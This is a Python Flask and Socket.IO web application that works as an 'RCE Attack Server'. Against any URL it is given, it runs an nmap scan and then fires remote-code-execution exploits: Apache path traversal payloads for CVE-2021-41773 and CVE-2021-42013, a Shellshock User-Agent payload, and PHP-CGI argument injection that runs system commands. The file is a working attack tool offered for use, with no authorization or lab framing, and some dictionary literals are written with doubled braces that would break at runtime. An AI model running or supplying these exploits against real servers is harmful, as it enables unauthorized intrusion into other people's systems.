import os
import requests
import threading
import subprocess
from urllib.parse import urlparse
from datetime import datetime
from flask import Flask, render_template, request
from flask_socketio import SocketIO

# --- Basic Setup ---
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, async_mode='threading')

# --- RCE Attack Logic ---

# CVE-2021-41773 & CVE-2021-42013: Path Traversal and RCE in Apache 2.4.49 & 2.4.50
APACHE_RCE_PAYLOADS = {
    "CVE-2021-41773_RCE": {
        "description": "Path traversal and RCE for Apache 2.4.49.",
        "payload": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    },
    "CVE-2021-42013_RCE": {
        "description": "More potent path traversal and RCE for Apache 2.4.50.",
        "payload": "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
    }
}

def log_message(message):
    """Helper function to emit log messages to the client."""
    print(message) # Log to server console
    socketio.emit('log', {'msg': f"[{datetime.now().strftime('%H:%M:%S')}] {message}"})

def execute_apache_rce(target_url, payload_path, command):
    """
    Attempts to execute a command on the target using a specific Apache RCE payload.
    """
    full_url = f"{target_url.rstrip('/')}{payload_path}"
    try:
        response = requests.post(full_url, data=f"echo; {command}", timeout=8, headers={{'Content-Type': 'text/plain'}})
        if response.status_code == 200 and response.text.strip():
            return response.text.strip()
    except requests.RequestException:
        return None

def execute_shellshock_rce(target_url, command):
    """
    Attempts to execute a command on the target using the Shellshock (CVE-2014-6271) vulnerability.
    """
    log_message("[ATTACK] Trying exploit: Shellshock (CVE-2014-6271)")
    payload = f"() {{ :; }}; echo; echo '---RCE_SUCCESS---'; {command}; echo; echo '---RCE_SUCCESS---'"
    headers = {"User-Agent": payload, "Accept": "*/*"}
    cgi_paths = ["/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.cgi", "/cgi-bin/default.cgi", "/cgi-bin/test"]
    
    for path in cgi_paths:
        full_url = f"{target_url.rstrip('/')}{path}"
        log_message(f"[ATTACK] Testing Shellshock on {full_url}")
        try:
            response = requests.get(full_url, headers=headers, timeout=8, verify=False)
            if "---RCE_SUCCESS---" in response.text:
                output = response.text.split("---RCE_SUCCESS---")[1].strip()
                log_message(f"[SUCCESS] Shellshock RCE successful on {full_url}!")
                log_message(f"[OUTPUT] '{command}' command output: {output}")
                return {{'path': full_url, 'output': output, 'cve': 'CVE-2014-6271'}}
        except requests.RequestException:
            continue
            
    log_message("[FAIL] Shellshock exploit did not succeed on tested paths.")
    return None

def execute_php_cgi_rce(target_url, command):
    """
    Attempts RCE on PHP-CGI (CVE-2012-1823).
    """
    log_message("[ATTACK] Trying exploit: PHP-CGI RCE (CVE-2012-1823)")
    query_string = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
    php_payload = f'<?php echo "---RCE_SUCCESS---"; system("{command}"); echo "---RCE_SUCCESS---"; ?>'
    
    php_paths = ["/index.php", "/test.php", "/info.php", "/phpinfo.php", "/upload.php"]
    
    for path in php_paths:
        full_url = f"{target_url.rstrip('/')}{path}{query_string}"
        log_message(f"[ATTACK] Testing PHP-CGI RCE on {full_url}")
        try:
            response = requests.post(full_url, data=php_payload, timeout=8, verify=False, headers={{'Content-Type': 'application/x-www-form-urlencoded'}})
            if "---RCE_SUCCESS---" in response.text:
                output = response.text.split("---RCE_SUCCESS---")[1].strip()
                log_message(f"[SUCCESS] PHP-CGI RCE successful on {full_url}!")
                log_message(f"[OUTPUT] '{command}' command output: {output}")
                return {{'path': full_url, 'output': output, 'cve': 'CVE-2012-1823'}}
        except requests.RequestException:
            continue
            
    log_message("[FAIL] PHP-CGI RCE exploit did not succeed on tested paths.")
    return None

def perform_attack(target_url):
    """
    Main attack function that runs in a background thread.
    """
    try:
        report_data = {
            "target": target_url,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "nmap_scan": "Not performed.",
            "results": []
        }

        log_message(f"[INFO] Starting aggressive RCE scan on {target_url}")

        # 1. Nmap Scan
        try:
            hostname = urlparse(target_url).hostname
            if not hostname: raise ValueError("Could not parse hostname from URL.")
            log_message(f"[SCAN] Running Nmap service scan on {hostname}... (this may take a moment)")
            nmap_command = ["nmap", "-sV", "-T4", "-Pn", hostname]
            nmap_result = subprocess.run(nmap_command, capture_output=True, text=True, timeout=180)
            nmap_output = nmap_result.stdout if nmap_result.stdout else nmap_result.stderr
            log_message("[SCAN] Nmap results:")
            for line in nmap_output.split('\n'):
                if 'PORT' in line or 'open' in line or 'Host is up' in line: log_message(line)
            report_data["nmap_scan"] = nmap_output
        except FileNotFoundError:
            log_message("[ERROR] Nmap command not found. Ensure Nmap is installed and in your system's PATH.")
            report_data["nmap_scan"] = "Nmap command not found. Skipping scan."
        except Exception as e:
            log_message(f"[ERROR] Nmap scan failed: {e}")
            report_data["nmap_scan"] = f"Nmap scan failed: {e}"

        # 2. Apache Path Traversal Exploit Attempts
        log_message("[ATTACK] Starting Apache RCE exploit chain...")
        for key, data in APACHE_RCE_PAYLOADS.items():
            log_message(f"[ATTACK] Trying exploit: {key} ({data['description']})")
            command_output = execute_apache_rce(target_url, data['payload'], "id")
            if command_output:
                log_message(f"[SUCCESS] RCE successful with {key}!")
                report_data["results"].append({{"cve": key, "status": "Successful", "output": command_output}})
                break
            else:
                log_message(f"[FAIL] Exploit {key} did not succeed.")
                report_data["results"].append({{"cve": key, "status": "Failed", "output": "Vulnerability not present or path not found."}})
        
        # 3. Shellshock Exploit Attempt
        shellshock_result = execute_shellshock_rce(target_url, "id")
        if shellshock_result:
            report_data["results"].append({{"cve": shellshock_result["cve"], "status": "Successful", "output": shellshock_result["output"]}})
        else:
            report_data["results"].append({{"cve": "CVE-2014-6271", "status": "Failed", "output": "Vulnerability not present or CGI paths not found."}})

        # 4. PHP-CGI RCE Exploit Attempt
        php_cgi_result = execute_php_cgi_rce(target_url, "id")
        if php_cgi_result:
            report_data["results"].append({{"cve": php_cgi_result["cve"], "status": "Successful", "output": php_cgi_result["output"]}})
        else:
            report_data["results"].append({{"cve": "CVE-2012-1823", "status": "Failed", "output": "Vulnerability not present or PHP-CGI not in use."}})

        log_message("[INFO] Attack sequence complete.")
        report_data["end_time"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        final_report_html = generate_html_report(report_data)
        socketio.emit('attack_complete', {'report': final_report_html})
    except Exception as e:
        log_message(f"[FATAL] An unexpected error occurred in the attack thread: {e}")
        socketio.emit('log', {'msg': f"[ERROR] An unexpected error occurred: {e}"})

def generate_html_report(data):
    """Generates an HTML report from the attack data."""
    # Simplified for debugging
    return "<html><body><h1>Report</h1></body></html>"

# --- Flask Routes ---
@app.route('/')
def index():
    """Serves the main HTML page."""
    return render_template('RCE.html')

# --- Socket.IO Events ---
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

@socketio.on('start_attack')
def handle_start_attack(json):
    """Handles the start attack event from the client."""
    target_url = json.get('target')
    if not target_url:
        log_message("[ERROR] No target URL provided.")
        return

    parsed_url = urlparse(target_url)
    if parsed_url.scheme not in ['http', 'https']:
        log_message(f"[ERROR] Invalid URL scheme: {parsed_url.scheme}. Please use http or https.")
        return
    
    threading.Thread(target=perform_attack, args=(target_url,)).start()

if __name__ == '__main__':
    print("Starting RCE Attack Server on http://localhost:8080")
    socketio.run(app, host='0.0.0.0', port=8080, debug=False)
